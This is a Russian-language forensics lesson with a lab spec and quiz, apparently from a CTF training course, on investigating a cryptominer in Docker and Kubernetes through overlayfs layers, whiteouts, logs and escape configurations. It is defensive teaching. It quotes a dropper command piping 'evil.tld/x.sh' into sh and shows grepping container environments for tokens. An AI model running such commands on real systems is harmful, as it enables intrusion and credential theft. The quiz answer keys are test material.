---
id: forensics-containers
title: "Форензика контейнеров и Docker"
category: forensics
parent: forensics-linux-artifacts
difficulty: medium
order: 1
tags: [docker, container, overlayfs, kubernetes, namespace, escape, forensics]
prerequisites: [forensics-linux-artifacts]
useful_for:
  - "CTF Forensics категория"
  - "Incident Response (контейнеры)"
  - "Анализ Docker/K8s"
estimated_minutes: 40
summary: "Анализ контейнеров и Docker: слои overlayfs, конфигурации, логи, escape-артефакты, форензика Kubernetes и восстановление изменений без перезаписи контейнера."
lab:
  kind: shell
  title: 'Практика: слои контейнера и whiteout'
  toolset: [core, grep]
  workdir: /home/student/task
  files: [task.md, docker-history.txt, notes.txt, overlay/upper/app/entrypoint.sh, overlay/upper/app/.wh.secret]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Контейнер — это слои overlay2. Верхний слой (`upper`) — изменения контейнера.'
    - 'Историю слоёв показывает `docker history`; удалённый файл помечен whiteout (`.wh.`).'
    - 'Ищи изменённые файлы: `grep -r nto overlay`.'
    - 'Выдели флаг: `grep -r nto overlay > found.txt`.'
---

## Вопрос, с которого всё начинается

На сервере с Docker заметили странность: процессор загружен под завязку, хотя ничего
тяжёлого не запускали. Подозрение — кто-то использовал контейнер для майнинга. Где
искать следы и как ничего не разрушить?

Контейнер — это не отдельная машина, а **процесс на хосте**, изолированный от остальных.
У него свои особенности, и в этом уроке мы разберём один подозрительный контейнер от
логов до изменённых файлов.

## Наш пример: контейнер miner

Смотрим нагрузку:

```bash
$ docker stats --no-stream
CONTAINER ID   NAME     CPU %
abc123         miner    398%
```

`docker stats` показывает потребление ресурсов контейнерами. 398% CPU (несколько ядер
сразу) — явный признак майнера. Смотрим, чем запущен контейнер:

```bash
$ docker inspect abc123 | jq '.[0].Config.Cmd,.[0].Config.Image'
["/bin/sh","-c","curl evil.tld/x.sh | sh"]
```

`docker inspect` показывает конфигурацию контейнера, а `jq` вытаскивает команду запуска.
Она скачивает и выполняет скрипт с внешнего адреса — классический дроппер.

## Шаг 1: как устроен контейнер

Файловая система контейнера собрана из **слоёв** (overlayfs): нижние — read-only слои
образа, верхний — записываемый, куда попадают все изменения. `docker inspect` показывает
пути:

```bash
$ docker inspect abc123 | jq '.[0].GraphDriver.Data'
{
  "LowerDir": "/var/lib/docker/overlay2/.../diff:...",
  "UpperDir": "/var/lib/docker/overlay2/abc123/diff",
  "MergedDir": "/var/lib/docker/overlay2/abc123/merged"
}
```

Всё, что контейнер менял, лежит в `UpperDir`. Это и есть «улика».

## Шаг 2: логи контейнера

```bash
$ docker logs abc123 2>&1 | head
Downloading miner...
```

`docker logs` показывает stdout/stderr контейнера. Те же данные лежат файлом:

```bash
$ cat /var/lib/docker/containers/abc123/abc123-json.log | jq -r '.log' | head
```

Логи в формате JSON — удобно фильтровать через `jq`.

## Шаг 3: что изменилось в верхнем слое

```bash
$ find /var/lib/docker/overlay2/abc123/diff -type f -newermt '-1 day'
/var/lib/docker/overlay2/abc123/diff/tmp/xmrig
$ sha256sum /var/lib/docker/overlay2/abc123/diff/tmp/xmrig
```

`find -newermt '-1 day'` показывает недавно изменённые файлы, а хеш бинаря — это IOC.
Так мы находим сам майнер `xmrig`.

## Шаг 4: удалённое внутри контейнера — whiteout

Если внутри контейнера файл удалили, физически он не стирается: в верхнем слое
появляется **whiteout** — пустой файл `.wh.<имя>`, который «перекрывает» файл из нижнего
слоя:

```bash
$ find /var/lib/docker/overlay2/abc123/diff -name '.wh.*'
```

Увидев `.wh.secret`, вы знаете: файл `secret` удалён в этом контейнере, но его копия
осталась в нижнем слое — оттуда его можно достать. Это ключ к поиску удалённых данных.

## Шаг 5: закрепление и escape

Внутри контейнера атакующий может закрепиться через том, cron хоста или Kubernetes.
Особенно опасны **escape-конфигурации**: привилегированный контейнер, проброс
`docker.sock`, монтирование корня хоста.

```bash
$ find / -name docker.sock 2>/dev/null
$ docker inspect abc123 | jq '.[0].HostConfig.Privileged,.[0].HostConfig.Binds'
```

Если контейнер привилегированный или ему смонтирован `docker.sock` — он может управлять
хостом. Это след потенциального выхода наружу.

## Шаг 6: Kubernetes

В кластере источники другие: события, audit log и etcd.

```bash
$ kubectl get events -A --sort-by=.lastTimestamp | tail -30
$ grep -iE 'exec|attach' /var/log/kubernetes/audit.log | head
$ jq 'select(.verb=="create" and .objectRef.subresource=="exec")' audit.log
```

Команда `kubectl exec` (запуск команды внутри пода) фиксируется в audit log — это прямой
след вторжения. Секреты кластера лежат в `etcd`, часто без шифрования.

## Извлечение образа без остановки

Чтобы не разрушить улику, снимите копию файловой системы контейнера до любых действий:

```bash
$ docker export abc123 -o container.tar
$ mkdir rootfs && tar -xf container.tar -C rootfs/
$ docker commit abc123 forensic/case:snapshot
$ cp -a /var/lib/docker/overlay2/abc123/diff ./snapshot_upper
```

`docker export` даёт «слитую» файловую систему (без метаданных слоёв), а копия `diff`
сохраняет верхний слой как есть. **Не запускайте `docker exec`** в подозрительный
контейнер: это изменит состояние и может активировать малварь.

## Аудит Docker daemon и хоста

```bash
$ cat /etc/docker/daemon.json
$ docker ps -a --no-trunc
$ journalctl -u docker --since '2024-03-01' | grep -iE 'start|exec|create'
$ docker events --since '2024-03-01' --until '2024-03-02'
```

`docker events` и `journalctl -u docker` фиксируют `exec_create`, `start`, `attach` —
прямые следы действий атакующего. Обязательно проверьте на **хосте** `authorized_keys`,
cron и systemd: контейнер с `--privileged` мог их изменить.

## Риски конфигурации

| Конфигурация | Риск |
|--------------|------|
| `--privileged` | полный доступ к хосту |
| `-v /:/host` | запись на хост |
| `-v /var/run/docker.sock` | управление Docker из контейнера |
| `--pid=host`/`--net=host` | доступ к процессам/сети хоста |
| `--cap-add SYS_ADMIN` | потенциальный escape |

## Kubernetes-форензика подробнее

Кроме audit log, в кластере смотрят события и спеки подов:

```bash
$ kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'
$ kubectl get pods -o json | jq '.items[] | select(.spec.volumes[].hostPath!=null) | .metadata.name'
$ etcdctl get /registry/pods --prefix --keys-only | head
```

Привилегированный под или под с `hostPath`-монтированием — потенциальный escape. А в
`etcd` лежит состояние всего кластера, включая секреты (часто не зашифрованные).

## Сравнение с хостом

Контейнерные артефакты бессмысленны в отрыве от хоста: сопоставляйте время создания слоя
с логами хоста (`journalctl`, `auditd`), выясняйте, какой процесс хоста породил контейнер,
и ищите общие точки — смонтированные тома и сетевые namespace.

## Проверка сети контейнера

Сеть контейнера изолирована своим namespace, но соединения видны с хоста:

```bash
$ docker inspect abc123 | jq '.[0].NetworkSettings.Networks'
$ docker network ls
$ docker network inspect bridge | jq '.[0].Containers'
$ ss -tnp | grep <pid-контейнера>
```

Если контейнер общался с C2, его соединения попадут в `netscan` из дампа памяти или в
сетевые логи хоста.

## Что даёт `docker history`

История образа показывает, из каких слоёв он собран, — так находят подозрительные
`RUN`-инструкции, добавленные атакующим:

```bash
$ docker history --no-trunc image:tag
$ docker images -a
```

## Что мы теперь знаем

- Контейнер — процесс на хосте со слоями overlayfs.
- Изменения контейнера лежат в `UpperDir`; удаления — в whiteout-файлах.
- `docker inspect` даёт конфигурацию, `docker logs` — вывод контейнера.
- Опасные конфигурации: `--privileged`, `docker.sock`, hostPath.
- В K8s следы вторжения — в audit log (особенно `exec`).

## На что смотреть дальше

- **Не делать `docker exec`** в подозрительный контейнер — это меняет состояние; сначала снимите образ.
- **Проверять volumes** — данные могут лежать вне слоёв контейнера.
- **Проверять hostPath/privileged** — там следы escape.
- **Сопоставлять с хостом** — контейнерные артефакты бессмысленны без логов хоста.
- **Сохранять `docker inspect` целиком** — там все параметры запуска.
- **Проверять `docker events`** — он фиксирует `exec`, даже если логи пусты.

## Волатильные артефакты работающего контейнера

Слои — это «диск» контейнера, но самый ценный материал живёт в памяти процесса. Пока
контейнер запущен, его namespace можно осмотреть **с хоста**, не заходя внутрь:

```bash
$ PID=$(docker inspect -f '{{.State.Pid}}' abc123)
$ ls -l /proc/$PID/root                    # корень ФС контейнера
$ cat /proc/$PID/environ | tr '\0' '\n' | grep -iE 'pass|token|key'
$ nsenter -t $PID -n ss -tnp               # соединения контейнера
$ ls -l /proc/$PID/cwd /proc/$PID/exe
```

`/proc/<pid>/root` — то же, что `merged`-каталог, но без docker. `environ` часто хранит
переменные с секретами (пароли БД, токены). `nsenter` даёт заглянуть в сетевой namespace
и увидеть соединения с C2. Всё это — без единой записи внутрь контейнера.

## Что теряется при `docker export`

`export` отдаёт плоскую ФС — и теряет важное: метаданные слоёв, whiteout-маркеры и
историю изменений. Для форензики это критично, поэтому **всегда** сохраняйте ещё и
`UpperDir` как есть:

```bash
$ cp -a /var/lib/docker/overlay2/abc123/diff ./upper_snapshot
$ find ./upper_snapshot -name '.wh.*' -printf '%P\n'
```

Whiteout-файлы в `export` не видны, а именно они доказывают, что злоумышленник **удалял**
файлы внутри контейнера.

## Шпаргалка: слои overlay2

| Каталог | Роль | Форензическая ценность |
|---------|------|------------------------|
| `lower/` | read-only слои образа | базовое состояние |
| `diff/` (= UpperDir) | изменения контейнера | главная улика |
| `merged/` | собранный вид | удобно читать |
| `work/` | служебный overlayfs | обычно пуст |
| `.wh.<name>` | whiteout (удаление) | след удаления |

## Если контейнер уже удалён

`docker rm` не затирает данные сразу: слои остаются на диске до сборки мусора. Проверьте
незанятые каталоги и сопоставьте время создания с инцидентом:

```bash
$ ls -lt /var/lib/docker/overlay2 | head
$ find /var/lib/docker/overlay2/*/diff -name 'xmrig*' -o -name '*.sh'
```

Пока не запущен `docker system prune`, удалённый контейнер можно восстановить.

## Проверка, что контейнер не перезапускался

`RestartCount` из `docker inspect` и время `State.StartedAt` показывают, сколько раз
контейнер поднимался заново — частые перезапуски выдают зацикленную малварь:

```bash
$ docker inspect abc123 | jq '.[0].RestartCount,.[0].State.StartedAt,.[0].State.FinishedAt'
```

Сопоставьте эти времена с логами хоста: расхождение означает, что процесс кто-то
перезапускал вручную.

## Быстрый обзор изменений: `docker diff`

`docker diff` мгновенно показывает, что контейнер изменил (`C`), добавил (`A`) или удалил
(`D`) относительно образа — быстрый способ найти свежие улики, не обходя `diff` вручную:

```bash
$ docker diff abc123 | head
A /tmp/xmrig
D /app/secret
```

## Квиз

Проверь себя.

```quiz
- question: "Где хранятся изменения (записываемый слой) контейнера?"
  options:
    - "в LowerDir"
    - "в UpperDir"
    - "в образе"
    - "в ядре"
  answer: 1
- question: "Что означает файл `.wh.<name>` в upperdir?"
  options:
    - "белый список"
    - "удалённый в контейнере файл (whiteout)"
    - "скрытый файл"
    - "том"
  answer: 1
- question: "Как получить «плоскую» ФС контейнера?"
  options:
    - "`docker export`"
    - "`docker run`"
    - "`docker ps`"
    - "`docker logs`"
  answer: 0
- question: "Какой признак опасной конфигурации контейнера?"
  options:
    - "непривилегированный"
    - "`Privileged: true` + примонтированный docker.sock"
    - "сетевое имя"
    - "образ из registry"
  answer: 1
- question: "Где токен сервис-аккаунта в Kubernetes-поде?"
  options:
    - "`/etc/passwd`"
    - "`/var/run/secrets/kubernetes.io/serviceaccount/token`"
    - "в логах"
    - "в CronJob"
  answer: 1
```

## Куда дальше

Мы нашли майнер внутри контейнера. Но чтобы понять, что именно запускалось, нужен
анализ самого бинарника — и здесь на помощь приходит **YARA**. Об этом — следующий
урок. А пока запомни: **верхний слой и whiteout хранят всё, что контейнер изменил или
удалил**.

## Где пригодится

- **CTF:** задачи с образами и дампами контейнеров.
- **Cloud IR:** расследование контейнерных инцидентов.
- **DevOps-безопасность:** аудит конфигураций.
- **K8s-безопасность:** выявление escape и эскалаций.
- **Пентест:** понимание следов в контейнерной среде.
